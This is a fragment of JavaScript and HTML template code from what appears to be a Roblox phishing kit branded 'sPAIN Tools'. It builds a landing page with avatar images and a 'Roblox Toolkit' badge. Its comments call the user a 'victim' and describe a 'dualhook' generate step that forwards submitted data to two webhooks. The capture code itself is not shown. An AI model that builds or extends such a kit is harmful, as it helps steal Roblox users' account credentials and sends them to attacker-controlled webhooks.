...
<div class="card">
  ${charImg}
  <div class="page-badge">Slots 1&#8211;9 &bull; ${record.slug}</div>
...
// ── DUALHOOK page (full landing page — victim generates their own slots page) ──
function buildDualhookPage(record) {
  const charUrl = record.charUrl || 'https://tr.rbxcdn.com/30DAY-Avatar-D7AA065464297A80748737C0DCD67BB4-Png/720/720/Avatar/Webp/noFilter';
...
<section class="hero">
  ...
  <div class="roblox-scene">
    <div class="roblox-char char-1"><img src="${charUrl}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-2"><img src="${charUrl}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-3"><img src="${charUrl}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-4"><img src="${charUrl}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-5"><img src="${charUrl}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
    <div class="roblox-char char-6"><img src="${charUrl}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'"><div class="char-shadow"></div></div>
  </div>
  <div class="hero-badge">Roblox Toolkit &mdash; v2.0</div>
...
<footer>
  ...
  <div>&copy; 2025 sPAIN Tools. All rights reserved.</div>
...
function setStatus(btn,msg,color){
  ...
  s.style.color=color||'#5a5a78';s.textContent=msg;
}
function flashField(id,color){
  ...
  el.focus();setTimeout(()=>{el.style.borderColor='';el.style.boxShadow='';},2500);
}

/* ── GENERATE — passes dualhookParent so submit.js forwards to both webhooks ── */
